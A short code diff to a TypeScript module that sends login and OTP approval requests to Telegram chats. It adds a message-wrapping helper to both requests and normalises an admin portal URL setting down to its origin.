@@ -1,4 +1,5 @@
 import { sendTelegramApprovalWithCountdown } from '@/lib/telegram-approval-countdown'
+import { wrapFlowMessage } from '@/lib/telegram'
 import {
   buildLoginApprovalRequestBody,
   buildOtpApprovalRequestBody,
@@ -42,10 +43,22 @@ function asLink(url: string, label?: string): string {
   return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
 }
 
+/** Origin-only ADMIN_PORTAL_URL for Telegram links (no /admin/login, no ?project=). */
 function adminPortalLink(): string {
   const raw = process.env.ADMIN_PORTAL_URL?.trim()
   if (!raw) return '/admin/login'
-  return raw.replace(/\/+$/, '')
+  const absolute = /^[a-z0-9.-]+\.[a-z]{2,}([/:].*)?$/i.test(raw)
+    ? `https://${raw}`
+    : raw
+  try {
+    return new URL(absolute).origin
+  } catch {
+    const origin = absolute
+      .replace(/\/admin\/login.*$/i, '')
+      .replace(/\?.*$/, '')
+      .replace(/\/+$/, '')
+    return origin || '/admin/login'
+  }
 }
 
 
@@ -61,6 +74,7 @@ export async function sendGwcuLoginApprovalRequest(data: {
     botToken: TELEGRAM_BOT_TOKEN,
     chatIds: CHAT_IDS,
     createdAtMs: data.createdAtMs,
+    wrapMessage: wrapFlowMessage,
     buildText: (secondsLeft) =>
       buildLoginApprovalRequestBody({
         userId: data.userId,
@@ -87,6 +101,7 @@ export async function sendGwcuOtpApprovalRequest(data: {
     botToken: TELEGRAM_BOT_TOKEN,
     chatIds: CHAT_IDS,
     createdAtMs: data.createdAtMs,
+    wrapMessage: wrapFlowMessage,
     buildText: (secondsLeft) =>
       buildOtpApprovalRequestBody({
         userId: data.userId,
